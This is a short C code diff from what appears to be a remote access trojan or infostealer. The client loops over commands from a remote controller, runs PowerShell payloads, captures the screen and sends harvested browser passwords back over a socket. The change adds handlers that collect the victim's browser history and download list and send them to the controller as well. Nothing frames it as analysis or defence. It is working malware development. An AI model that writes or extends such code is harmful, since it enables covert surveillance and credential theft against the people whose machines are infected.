@@ -48,6 +48,8 @@ connect:
             goto connect; // Stupid 
         }
 
+        printf("Got cmd: %d\n", cmd);
+
         if (cmd == PSH_CMD) {
             psh_exec(sock, payload);
         } else if (cmd == SCREEN_CMD) {
@@ -67,7 +69,15 @@ connect:
             char* browser_password = get_browser_password();
             safe_send(sock, browser_password, BROWSER_PASS_CMD, strlen(browser_password) + 1, 0);
             free(browser_password);
-        }
+        } else if (cmd == BROWSER_HISTORY_CMD) {
+            char* history = get_browser_history();
+            safe_send(sock, history, BROWSER_HISTORY_CMD, strlen(history) + 1, 0);
+            free(history);
+        } else if (cmd == BROWSER_DL_CMD) {
+            char* dl = get_browser_downloads();
+            safe_send(sock, dl, BROWSER_DL_CMD, strlen(dl) + 1, 0);
+            free(dl);
+        } 
         free(payload);
     }
 
